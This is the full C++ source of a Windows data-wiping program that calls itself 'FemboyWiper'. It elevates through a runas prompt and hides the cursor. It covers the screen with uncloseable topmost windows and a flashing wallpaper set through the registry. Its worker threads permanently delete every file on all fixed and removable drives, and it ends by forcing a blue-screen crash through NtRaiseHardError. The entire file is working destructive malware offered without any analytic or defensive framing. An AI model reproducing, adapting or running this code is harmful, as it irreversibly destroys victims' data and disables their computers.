#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <deque>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

#define DELAY_MS 12000

static CRITICAL_SECTION g_cs;
static std::deque<std::wstring> g_fileQueue;
static std::deque<std::wstring> g_dirQueue;
static volatile LONG g_done = 0;
static volatile LONG g_total = 0;
static volatile LONG g_wiperRunning = 0;

static void DeletePermanent(const std::wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    }
    DeleteFileW(path.c_str());
}

static void EnqueueDir(const std::wstring& dir) {
    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    std::vector<std::wstring> subs;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0) continue;

        std::wstring full = dir + L"\\" + fd.cFileName;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            subs.push_back(full);
        } else {
            EnterCriticalSection(&g_cs);
            g_fileQueue.push_back(full);
            InterlockedIncrement(&g_total);
            LeaveCriticalSection(&g_cs);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);

    for (auto& s : subs) {
        EnqueueDir(s);
        EnterCriticalSection(&g_cs);
        g_dirQueue.push_back(s);
        LeaveCriticalSection(&g_cs);
    }
}

static DWORD WINAPI WorkerProc(LPVOID) {
    while (true) {
        std::wstring path;
        bool has = false;
        EnterCriticalSection(&g_cs);
        if (!g_fileQueue.empty()) {
            path = g_fileQueue.front();
            g_fileQueue.pop_front();
            has = true;
        }
        LeaveCriticalSection(&g_cs);

        if (!has) {
            if (g_fileQueue.empty()) break;
            Sleep(1);
            continue;
        }

        DeletePermanent(path);
        InterlockedIncrement(&g_done);
    }
    return 0;
}

static void CleanupDirs() {
    while (!g_dirQueue.empty()) {
        std::wstring d = g_dirQueue.back();
        g_dirQueue.pop_back();
        RemoveDirectoryW(d.c_str());
    }
}

static void EnqueueAllDrives() {
    wchar_t drives[] = L"CDEFGHIJKLMNOPQRSTUVWXYZ";
    for (const wchar_t* d = drives; *d; ++d) {
        std::wstring root = std::wstring(1, *d) + L":\\";
        UINT t = GetDriveTypeW(root.c_str());
        if (t == DRIVE_FIXED || t == DRIVE_REMOVABLE) {
            EnqueueDir(root);
        }
    }
}

static const wchar_t* MSG = L"FemboyWiper it's Here!!";
static int g_screenW = 0, g_screenH = 0;

static LRESULT CALLBACK TabWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CLOSE:   return 0;
    case WM_DESTROY: return 0;
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN:
        if (w == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
        if (w == VK_ESCAPE) return 0;
        break;
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(h, &ps);

        RECT rc; GetClientRect(h, &rc);
        HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rc, bg);
        DeleteObject(bg);

        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));

        HFONT font = CreateFontW(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH, L"Consolas");
        HGDIOBJ old = SelectObject(hdc, font);

        int x = 0, y = 20;
        int dir = 1;
        while (x < g_screenW) {
            TextOutW(hdc, x, y, MSG, (int)wcslen(MSG));
            x += 350;
            y += dir * 60;
            if (y > g_screenH - 80 || y < 0) dir = -dir;
        }

        SelectObject(hdc, old);
        DeleteObject(font);
        EndPaint(h, &ps);
        return 0;
    }
    }
    return DefWindowProcW(h, m, w, l);
}

static VOID CALLBACK TabTimer(HWND h, UINT, UINT_PTR, DWORD) {
    InvalidateRect(h, NULL, FALSE);
    while (ShowCursor(FALSE) >= 0);
    SetCursor(NULL);
}

static HWND SpawnTabWindow(HINSTANCE hInst, int x, int y, int w, int h) {
    static bool classReg = false;
    if (!classReg) {
        WNDCLASSW wc = {0};
        wc.lpfnWndProc = TabWndProc;
        wc.hInstance = hInst;
        wc.lpszClassName = L"FemboyTabWnd";
        wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
        RegisterClassW(&wc);
        classReg = true;
    }

    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"FemboyTabWnd", L"FemboyWiper it's Here!!",
        WS_POPUP | WS_VISIBLE,
        x, y, w, h,
        NULL, NULL, hInst, NULL);

    if (hWnd) {
        SetTimer(hWnd, 1, 100, TabTimer);
    }
    return hWnd;
}

static void MakeDiscoBmp(const std::wstring& path, bool invert) {
    const int W = 1920, H = 1080;
    DWORD imgSize = W * H * 3;
    DWORD fileSize = 54 + imgSize;
    BYTE header[54] = {0};
    header[0] = 'B'; header[1] = 'M';
    *(DWORD*)&header[2] = fileSize;
    *(DWORD*)&header[10] = 54;
    *(DWORD*)&header[14] = 40;
    *(DWORD*)&header[18] = W;
    *(DWORD*)&header[22] = H;
    *(WORD*)&header[26] = 1;
    *(WORD*)&header[28] = 24;
    *(DWORD*)&header[34] = imgSize;
    *(DWORD*)&header[38] = 2835;
    *(DWORD*)&header[42] = 2835;

    std::vector<BYTE> pixels(imgSize);
    if (invert) {
        for (int y = 0; y < H; ++y) {
            for (int x = 0; x < W; ++x) {
                int block = ((x / 100) + (y / 100)) % 2;
                BYTE c = block ? 0xFF : 0x00;
                int idx = (y * W + x) * 3;
                pixels[idx]     = c;
                pixels[idx + 1] = c;
                pixels[idx + 2] = c;
            }
        }
    } else {
        memset(pixels.data(), 0, imgSize);
    }

    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, header, 54, &w, NULL);
        WriteFile(h, pixels.data(), imgSize, &w, NULL);
        CloseHandle(h);
    }
}

static DWORD WINAPI DiscoWallpaperThread(LPVOID) {
    wchar_t temp[MAX_PATH];
    GetTempPathW(MAX_PATH, temp);

    std::wstring bmpA = std::wstring(temp) + L"disco_a.bmp";
    std::wstring bmpB = std::wstring(temp) + L"disco_b.bmp";

    MakeDiscoBmp(bmpA, true);  
    MakeDiscoBmp(bmpB, false);

    bool flip = false;
    while (true) {
        const std::wstring& cur = flip ? bmpB : bmpA;

        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0,
            (PVOID)cur.c_str(),
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        HKEY k;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Control Panel\\Desktop", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
            RegSetValueExW(k, L"Wallpaper", 0, REG_SZ,
                (const BYTE*)cur.c_str(),
                (DWORD)((cur.length()+1)*sizeof(wchar_t)));
            const wchar_t* style = L"10";
            RegSetValueExW(k, L"WallpaperStyle", 0, REG_SZ,
                (const BYTE*)style, (DWORD)((wcslen(style)+1)*sizeof(wchar_t)));
            const wchar_t* tile = L"0";
            RegSetValueExW(k, L"TileWallpaper", 0, REG_SZ,
                (const BYTE*)tile, (DWORD)((wcslen(tile)+1)*sizeof(wchar_t)));
            RegCloseKey(k);
        }

        flip = !flip;
        Sleep(1000);
    }
    return 0;
}

static DWORD WINAPI TabSpamThread(LPVOID lpParam) {
    HINSTANCE hInst = (HINSTANCE)lpParam;
    srand((unsigned)GetTickCount());
    const int tabW = 500;
    const int tabH = 300;
    int cols = g_screenW / tabW + 2;
    int rows = 3;
    std::vector<HWND> windows;
    for (int r = 0; r < rows; ++r) {
        for (int c = 0; c < cols; ++c) {
            int idx = r * cols + c;
            int x, y;

            if (r % 2 == 0) {
                x = c * tabW - (tabW / 2);
            } else {
                x = (cols - 1 - c) * tabW - (tabW / 2);
            }
            y = r * tabH;

            HWND hWnd = SpawnTabWindow(hInst, x, y, tabW, tabH);
            if (hWnd) windows.push_back(hWnd);
        }
    }

    while (true) {
        Sleep(2000);
        for (auto h : windows) {
            if (!IsWindow(h)) {
                HWND n = SpawnTabWindow(hInst,
                    rand() % g_screenW, rand() % g_screenH, tabW, tabH);
                if (n) h = n;
            } else {
                SetWindowPos(h, HWND_TOPMOST, 0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
            }
        }
        while (ShowCursor(FALSE) >= 0);
        SetCursor(NULL);
    }
    return 0;
}

static BOOL IsAdmin() {
    BOOL a = FALSE; PSID g = NULL;
    SID_IDENTIFIER_AUTHORITY n = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&n, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0,0,0,0,0,0,&g)) {
        CheckTokenMembership(NULL, g, &a);
        FreeSid(g);
    }
    return a;
}

static void Elevate() {
    wchar_t p[MAX_PATH]; GetModuleFileNameW(NULL, p, MAX_PATH);
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas"; sei.lpFile = p; sei.hShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    if (!ShellExecuteExW(&sei)) ExitProcess(0);
    ExitProcess(0);
}

typedef NTSTATUS(WINAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(WINAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

static void TriggerBSOD() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) return;
    auto RtlAdjustPrivilege =
        (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError =
        (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege && NtRaiseHardError) {
        BOOLEAN en = FALSE; ULONG resp = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &en);
        NtRaiseHardError(0xC0000218, 0, 0, NULL, 6, &resp);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    if (!IsAdmin()) { Elevate(); return 0; }
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    g_screenW = GetSystemMetrics(SM_CXSCREEN);
    g_screenH = GetSystemMetrics(SM_CYSCREEN);
    Sleep(DELAY_MS);
    while (ShowCursor(FALSE) >= 0);
    SetCursor(NULL);
    CreateThread(NULL, 0, DiscoWallpaperThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TabSpamThread, (LPVOID)hInst, 0, NULL);
    InterlockedExchange(&g_wiperRunning, 1);
    InitializeCriticalSection(&g_cs);
    EnqueueAllDrives();
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    int numWorkers = si.dwNumberOfProcessors * 4;
    if (numWorkers < 8) numWorkers = 8;
    if (numWorkers > 32) numWorkers = 32;
    std::vector<HANDLE> threads;
    for (int i = 0; i < numWorkers; ++i) {
        HANDLE t = CreateThread(NULL, 0, WorkerProc, NULL, 0, NULL);
        if (t) threads.push_back(t);
    }
    WaitForMultipleObjects((DWORD)threads.size(),
        threads.data(), TRUE, INFINITE);
    for (auto t : threads) CloseHandle(t);
    CleanupDirs();
    DeleteCriticalSection(&g_cs);
    TriggerBSOD();
    while (true) Sleep(60000);
    return 0;
}
